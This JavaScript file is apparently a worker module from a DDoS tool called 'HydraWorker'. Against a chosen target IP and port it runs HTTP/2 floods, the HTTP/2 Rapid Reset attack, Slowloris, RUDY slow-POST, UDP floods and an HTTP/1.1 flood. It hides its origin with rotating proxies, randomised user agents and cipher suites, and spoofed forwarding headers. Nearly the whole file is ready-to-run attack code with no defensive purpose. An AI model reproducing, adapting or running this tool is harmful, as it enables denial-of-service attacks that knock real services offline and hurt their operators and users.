
(async () => {
const { parentPort, workerData } = require('worker_threads');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const dgram = require('dgram');
const http2 = require('http2');
const http = require('http');

const {
    targetIP, port, attackType, attackMode, durationMs, httpMethod,
    workerId, USER_AGENTS, CHARSET, proxyList, payloadTemplates,
    maxConsecutiveFailures, maxErrorsPerWorker, backoffBase, maxBackoff, verbose, customHeaders,
} = workerData;

let sent = 0, active = 0, errors = 0, serverErrors = 0;
let isStopping = false, isPaused = false;
let consecutiveFailures = 0;
let socket = null, tlsConn = null, http2Client = null;
let durationTimer = null;
let currentProxyIndex = 0;

const localUA = USER_AGENTS || ['HydraWorker'];
const charset = CHARSET || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

function rand(n) { return Math.floor(Math.random() * n); }
function randStr(len) { let s=''; for(let i=0;i<len;i++) s+=charset[rand(charset.length)]; return s; }
function randUA() { return localUA[rand(localUA.length)]; }
function randIP() { return `${rand(255)+1}.${rand(255)+1}.${rand(255)+1}.${rand(255)+1}`; }
function randPayload() { return payloadTemplates && payloadTemplates.length ? payloadTemplates[rand(payloadTemplates.length)] : '/'; }
function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }
function getProxy() {
    if (!proxyList || proxyList.length === 0) return null;
    const p = proxyList[currentProxyIndex % proxyList.length];
    currentProxyIndex++;
    return p;
}

const CIPHER_LIST = [
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-ECDSA-AES128-SHA256',
    'ECDHE-RSA-AES256-SHA384',
    'ECDHE-ECDSA-AES256-SHA384',
    'AES128-GCM-SHA256',
    'AES256-GCM-SHA384',
    'AES128-SHA256',
    'AES256-SHA256',
];
function randomCiphers() {
    const shuffled = CIPHER_LIST.sort(() => Math.random() - 0.5);
    return shuffled.slice(0, Math.min(5 + rand(5), shuffled.length)).join(':');
}

function sendStats(extra = {}) {
    parentPort.postMessage({
        type: 'stats',
        sent: sent,
        active: active,
        errors: errors,
        serverErrors: serverErrors,
        ...extra,
    });
}
function sendLog(message) {
    parentPort.postMessage({ type: 'log', message: message });
}
function cleanup(reason) {
    if (isStopping) return;
    isStopping = true;
    if (durationTimer) { clearTimeout(durationTimer); durationTimer = null; }
    // Tutup koneksi sekali saja
    if (http2Client && !http2Client.destroyed) {
        http2Client.destroy();
        http2Client = null;
    }
    if (tlsConn && !tlsConn.destroyed) {
        tlsConn.destroy();
        tlsConn = null;
    }
    if (socket && !socket.destroyed) {
        socket.destroy();
        socket = null;
    }
    active = 0;
    sendStats({ workerId, reason });
    parentPort.postMessage({ type: 'done', workerId });
}

if (durationMs && durationMs > 0) {
    durationTimer = setTimeout(() => cleanup('Duration limit reached'), durationMs);
}

parentPort.on('message', (msg) => {
    if (msg.type === 'stop') cleanup('Received stop');
    if (msg.type === 'pause') isPaused = true;
    if (msg.type === 'resume') isPaused = false;
});

// --- HTTP/2 Normal (menggunakan port dari config) ---
async function http2NormalAttack() {
    let statsCounter = 0;
    while (!isStopping) {
        if (isPaused) { await sleep(100); continue; }
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) {
            cleanup(`Too many errors (>${maxErrorsPerWorker})`);
            return;
        }
        let errorLogged = false;
        try {
            const proxy = getProxy();
            let proxySocket = null;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                proxySocket = net.connect(proxyPort, proxyHost);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) resolve();
                        else reject(new Error('Proxy CONNECT failed'));
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                // Gunakan port yang diberikan (bukan hardcode 443)
                tlsConn = tls.connect({
                    host: targetIP,
                    port: port,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            } else {
                tlsConn = tls.connect({
                    host: targetIP,
                    port: port,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            }
            active = 1;
            if (statsCounter % 10 === 0) sendStats();

            // Perbaiki: gunakan port yang benar di URL
            const scheme = port === 443 ? 'https' : 'http';
            http2Client = http2.connect(`${scheme}://${targetIP}:${port}`, { createConnection: () => tlsConn });
            http2Client.on('error', (err) => {
                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                http2Client.destroy();
            });

            const payload = randPayload();
            const method = httpMethod || 'GET';
            const headers = {
                ':method': method,
                ':path': payload + '?' + randStr(12) + '=' + randStr(8),
                ':scheme': scheme,
                ':authority': targetIP + ':' + port,
                'user-agent': randUA(),
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'x-forwarded-for': randIP(),
                'x-real-ip': randIP(),
                'referer': 'https://' + randStr(8) + '.com/',
            };
            if (customHeaders) Object.assign(headers, customHeaders);

            const req = http2Client.request(headers);
            req.on('response', (response) => {
                consecutiveFailures = 0;
                const status = response.headers[':status'] || 0;
                if (status >= 400 && status < 600) serverErrors++;
                sendStats();
                req.destroy();
                // Bersihkan koneksi setelah response, sekali saja
                if (http2Client && !http2Client.destroyed) {
                    http2Client.destroy();
                    http2Client = null;
                }
                if (tlsConn && !tlsConn.destroyed) {
                    tlsConn.destroy();
                    tlsConn = null;
                }
                if (socket && !socket.destroyed) {
                    socket.destroy();
                    socket = null;
                }
                active = 0;
            });
            req.on('error', (err) => {
                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                req.destroy();
                // Bersihkan
                if (http2Client && !http2Client.destroyed) {
                    http2Client.destroy();
                    http2Client = null;
                }
                if (tlsConn && !tlsConn.destroyed) {
                    tlsConn.destroy();
                    tlsConn = null;
                }
                if (socket && !socket.destroyed) {
                    socket.destroy();
                    socket = null;
                }
                active = 0;
            });
            req.end();
            await sleep(10 + rand(20));
        } catch (err) {
            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(`Max consecutive failures (${maxConsecutiveFailures}) reached`);
                return;
            }
            // Bersihkan
            if (http2Client && !http2Client.destroyed) {
                http2Client.destroy();
                http2Client = null;
            }
            if (tlsConn && !tlsConn.destroyed) {
                tlsConn.destroy();
                tlsConn = null;
            }
            if (socket && !socket.destroyed) {
                socket.destroy();
                socket = null;
            }
            active = 0;
            await sleep(2000 + rand(3000));
        }
    }
}

// --- Rapid Reset (juga gunakan port) ---
async function http2RapidResetAttack() {
    let statsCounter = 0;
    while (!isStopping) {
        if (isPaused) { await sleep(100); continue; }
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) {
            cleanup(`Too many errors (>${maxErrorsPerWorker})`);
            return;
        }
        let errorLogged = false;
        try {
            const proxy = getProxy();
            let proxySocket = null;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                proxySocket = net.connect(proxyPort, proxyHost);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) resolve();
                        else reject(new Error('Proxy CONNECT failed'));
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                tlsConn = tls.connect({
                    host: targetIP,
                    port: port,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            } else {
                tlsConn = tls.connect({
                    host: targetIP,
                    port: port,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            }
            active = 1;
            if (statsCounter % 10 === 0) sendStats();

            const scheme = port === 443 ? 'https' : 'http';
            http2Client = http2.connect(`${scheme}://${targetIP}:${port}`, { createConnection: () => tlsConn });
            http2Client.on('error', (err) => {
                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                http2Client.destroy();
            });

            const payload = randPayload();
            const method = httpMethod || 'GET';
            const headers = {
                ':method': method,
                ':path': payload + '?' + randStr(12) + '=' + randStr(8),
                ':scheme': scheme,
                ':authority': targetIP + ':' + port,
                'user-agent': randUA(),
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'x-forwarded-for': randIP(),
                'x-real-ip': randIP(),
                'referer': 'https://' + randStr(8) + '.com/',
            };
            if (customHeaders) Object.assign(headers, customHeaders);

            const streams = [];
            for (let i = 0; i < 20; i++) {
                const req = http2Client.request(headers);
                req.on('error', () => {});
                req.end();
                streams.push(req);
            }
            for (const req of streams) req.destroy();
            // Bersihkan koneksi sekali
            if (http2Client && !http2Client.destroyed) {
                http2Client.destroy();
                http2Client = null;
            }
            if (tlsConn && !tlsConn.destroyed) {
                tlsConn.destroy();
                tlsConn = null;
            }
            if (socket && !socket.destroyed) {
                socket.destroy();
                socket = null;
            }
            active = 0;
            await sleep(1 + rand(5));
        } catch (err) {
            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(`Max consecutive failures (${maxConsecutiveFailures}) reached`);
                return;
            }
            if (http2Client && !http2Client.destroyed) {
                http2Client.destroy();
                http2Client = null;
            }
            if (tlsConn && !tlsConn.destroyed) {
                tlsConn.destroy();
                tlsConn = null;
            }
            if (socket && !socket.destroyed) {
                socket.destroy();
                socket = null;
            }
            active = 0;
            await sleep(100 + rand(300));
        }
    }
}

// --- Slowloris (dengan proxy) ---
async function slowlorisAttack() {
    while (!isStopping) {
        if (isPaused) { await sleep(100); continue; }
        sent++;
        if (errors > maxErrorsPerWorker) {
            cleanup(`Too many errors (>${maxErrorsPerWorker})`);
            return;
        }
        let errorLogged = false;
        try {
            const proxy = getProxy();
            // Buat koneksi melalui proxy jika ada
            let socket;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                const proxySocket = net.connect(proxyPort, proxyHost);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) resolve();
                        else reject(new Error('Proxy CONNECT failed'));
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                socket = tls.connect({
                    host: targetIP,
                    port: port,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                });
            } else {
                socket = tls.connect({
                    host: targetIP,
                    port: port,
                    rejectUnauthorized: false,
                });
            }
            // Kirim request slowloris
            const req = http.request({
                socket: socket,
                host: targetIP,
                port: port,
                method: 'GET',
                path: randPayload() + '?' + randStr(12),
                headers: {
                    'User-Agent': randUA(),
                    'Accept': '*/*',
                    'Accept-Encoding': 'identity',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': randIP(),
                },
                rejectUnauthorized: false,
            });
            if (customHeaders) Object.assign(req.headers, customHeaders);
            req.setTimeout(30000);
            req.on('error', (err) => {
                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            });
            req.write('X-Slowloris: ' + randStr(20) + '
');
            const interval = setInterval(() => {
                if (isStopping || req.destroyed) { clearInterval(interval); return; }
                req.write('X-KeepAlive: ' + randStr(10) + '
');
            }, 5000 + rand(5000));
            while (!isStopping && !req.destroyed) await sleep(100);
            clearInterval(interval);
            req.destroy();
        } catch (err) {
            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(`Max failures reached`);
                return;
            }
            await sleep(2000 + rand(3000));
        }
    }
}

// --- RUDY (dengan proxy) ---
async function rudyAttack() {
    while (!isStopping) {
        if (isPaused) { await sleep(100); continue; }
        sent++;
        if (errors > maxErrorsPerWorker) {
            cleanup(`Too many errors (>${maxErrorsPerWorker})`);
            return;
        }
        let errorLogged = false;
        try {
            const proxy = getProxy();
            let socket;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                const proxySocket = net.connect(proxyPort, proxyHost);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) resolve();
                        else reject(new Error('Proxy CONNECT failed'));
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                socket = tls.connect({
                    host: targetIP,
                    port: port,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                });
            } else {
                socket = tls.connect({
                    host: targetIP,
                    port: port,
                    rejectUnauthorized: false,
                });
            }
            const payloadSize = 1024 * 1024 * (1 + rand(2));
            const req = http.request({
                socket: socket,
                host: targetIP,
                port: port,
                method: 'POST',
                path: randPayload() + '?' + randStr(12),
                headers: {
                    'User-Agent': randUA(),
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': payloadSize,
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': randIP(),
                },
                rejectUnauthorized: false,
            });
            if (customHeaders) Object.assign(req.headers, customHeaders);
            req.on('error', (err) => {
                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            });
            const chunkSize = 1024;
            let sentBytes = 0;
            while (sentBytes < payloadSize && !isStopping && !req.destroyed) {
                const chunk = Buffer.from(randStr(chunkSize));
                req.write(chunk);
                sentBytes += chunkSize;
                await sleep(100 + rand(200));
            }
            req.end();
            sendStats();
        } catch (err) {
            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(`Max failures reached`);
                return;
            }
            await sleep(2000 + rand(3000));
        }
    }
}

// --- UDP ---
async function udpAttack() {
    const udpSocket = dgram.createSocket('udp4');
    let errorLogged = false;
    udpSocket.on('error', (err) => {
        if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
    });
    udpSocket.on('message', () => { serverErrors++; sendStats(); });
    const startTime = Date.now();
    let statsCounter = 0;
    while (!isStopping) {
        if (isPaused) { await sleep(100); continue; }
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) {
            cleanup(`Too many errors (>${maxErrorsPerWorker})`);
            return;
        }
        if (durationMs && Date.now() - startTime > durationMs) break;
        try {
            const payload = Buffer.from(randStr(1400));
            udpSocket.send(payload, port, targetIP, (err) => {
                if (err) {
                    if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
                } else {
                    if (statsCounter % 10 === 0) sendStats();
                }
            });
            await sleep(1 + rand(10));
        } catch (e) {
            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
        }
    }
    udpSocket.close();
    cleanup('UDP finished');
}

let timeoutCounter = 0;
const timeoutInterval = setInterval(() => {
    if (isStopping) { clearInterval(timeoutInterval); return; }
    timeoutCounter++;
    if (timeoutCounter % 2 === 0) sendLog('Request Timed Out');
}, 2000);

if (attackType === 'udp') {
    await udpAttack();
} else if (attackType === 'https') {
    if (attackMode === 'rapid_reset') await http2RapidResetAttack();
    else if (attackMode === 'slowloris') await slowlorisAttack();
    else if (attackMode === 'rudy') await rudyAttack();
    else await http2NormalAttack();
} else {
    // HTTP/1.1 fallback (dengan proxy jika ada)
    let statsCounter = 0;
    while (!isStopping) {
        if (isPaused) { await sleep(100); continue; }
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) break;
        let errorLogged = false;
        try {
            const proxy = getProxy();
            let socket;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                const proxySocket = net.connect(proxyPort, proxyHost);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) resolve();
                        else reject(new Error('Proxy CONNECT failed'));
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                socket = tls.connect({
                    host: targetIP,
                    port: port,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                });
            } else {
                socket = tls.connect({
                    host: targetIP,
                    port: port,
                    rejectUnauthorized: false,
                });
            }
            const options = {
                socket: socket,
                host: targetIP,
                port: port,
                method: httpMethod || 'GET',
                path: randPayload() + '?' + randStr(12),
                headers: {
                    'User-Agent': randUA(),
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': randIP(),
                    'X-Real-IP': randIP(),
                    'Referer': 'https://' + randStr(8) + '.com/',
                },
                rejectUnauthorized: false,
            };
            if (customHeaders) Object.assign(options.headers, customHeaders);
            const req = http.request(options);
            req.on('response', (response) => {
                consecutiveFailures = 0;
                const status = response.statusCode || 0;
                if (status >= 400 && status < 600) serverErrors++;
                if (statsCounter % 10 === 0) sendStats();
                req.destroy();
            });
            req.on('error', (err) => {
                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            });
            req.end();
            await sleep(10 + rand(20));
        } catch (err) {
            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup('Max failures reached');
                return;
            }
            await sleep(2000 + rand(3000));
        }
    }
}
})();
